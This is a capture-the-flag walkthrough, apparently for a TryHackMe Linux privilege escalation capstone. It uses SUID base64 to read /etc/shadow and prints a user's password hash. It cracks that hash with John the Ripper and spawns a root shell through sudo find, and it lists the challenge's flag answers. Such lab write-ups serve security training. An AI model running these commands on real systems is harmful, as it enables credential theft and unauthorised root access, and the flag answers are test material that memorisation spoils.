## Linux Privilege Escalation: Capstone Challenge


## What is the content of the flag1.txt file?

1. Let's gather info first about the machine
```
history
whoami
uname -a
uname -r 
/proc/version
/etc/issue
ps
sudo -l
ls
id
ifconfig
netstat -a
netstat -at
netstat -au
netstat -l 
env
```

![Screenshot 2024-02-12 at 10 52 50 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/93885557-a88e-46b1-afec-ce37ae12a6da)

2. Let's go to /home where we will discover that there are two other users `missy` and `rootflag`. From the history we know that the flag2.txt is in rootflag user. So chances are the `flag1.txt` is in `/home/missy`.

3. Let's first try checking if there is a kernel exploit.

![Screenshot 2024-02-12 at 10 57 42 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/0816430f-bb90-4de7-84c3-25b1230dba59)

Let's make a quick look for a kernel exploit for version. `3.10.0-1160.el7.x86_64`

4. Let's check for sudo rights `sudo -l`. Unfortunately `leonard` has no sudo rights. 
![Screenshot 2024-02-12 at 11 07 07 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/2c027c13-d03b-4e63-afc9-2f180c7868a0)

5. Check for SUID privileges.

`find / -type f -perm -04000 -ls 2>/dev/null`

![Screenshot 2024-02-12 at 11 10 10 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/7e65ff32-4be2-47e8-84ed-04bc072516c1)

There are multiple binaries which our current user has SUID access. Let's go to [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid) to check if we can exploit any of these for root access.

We can exploit `base64` to read `/etc/passwd` and `/etc/shadow` and find information about user `missy`. Unfortunately we can't find any info about `rootflag` in these files. 

```bash
LFILE=/etc/passwd
base64 "$LFILE" | base64 --decode
```
**missy:x:1001:1001::/home/missy:/bin/bash**

```bash
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
```
**missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::**

6. Let's try cracking the password for `missy`. Create a local file `passwd.txt` and `shadow.txt` and copy the content from the target machine.

7. Unshadow the files:
   
   ```bash
   unshadow passwd.txt shadow.txt > passwords.txt
   ```
   
9. Run john the ripper on `passwords.txt`. Where we find that the password for `missy` is **Password1**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

9. Now on the target machine let's switch user to `missy` and use the password **Password1
```bash
su missy
cd /home/missy/Documents
cat flag1.txt
```

![Screenshot 2024-02-12 at 11 36 34 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/4ae12f6d-b4d0-424f-9526-b129ffe82e1b)

**Answer: THM-42828719920544**


## What is the content of the flag2.txt file?

1. Continuing from what we have done above, the current user is now `missy`. Let's check her privileges by running `sudo -l`
![Screenshot 2024-02-13 at 12 00 14 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/115e5260-e0a4-4719-a074-86f4977579ca)

2. We find out that user `missy` has sudo priviliges for `find`. Looking at [https://gtfobins.github.io/#+sudo](https://gtfobins.github.io/#+sudo), we discover we have sudo exploits for the `find` binary.
![Screenshot 2024-02-13 at 12 04 23 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/b4620444-2758-4034-a842-5c9e403eb604)

3. Let's execute what we have found in GTFObins which will spawn a terminal with root privileges. 
```bash
sudo find . -exec /bin/sh \; -quit
```
![Screenshot 2024-02-13 at 12 06 17 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/eb86560c-67b6-4bb0-b3a2-90ab9eb5462a)

4. Now let's find out the content of `flag2.txt `which is found in `/home/rootflag`

![Screenshot 2024-02-13 at 12 08 15 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/518b0142-04f4-43c8-bb93-848a65b03672)

**Answer: THM-168824782390238**


